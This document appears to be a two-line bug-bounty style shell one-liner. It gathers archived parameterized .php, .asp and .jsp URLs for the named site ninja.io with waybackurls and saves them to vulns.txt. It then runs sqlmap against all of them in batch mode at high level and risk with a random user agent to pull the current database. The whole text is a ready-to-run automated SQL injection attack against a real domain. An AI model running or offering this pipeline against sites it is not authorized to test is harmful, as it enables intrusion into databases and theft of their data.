echo "https://ninja.io" | waybackurls | grep -E '.php|.asp|.jsp' | grep '=' | urldedupe | tee vulns.txt;
sqlmap -m vulns.txt --batch --random-agent --current-db --level 5 --risk 2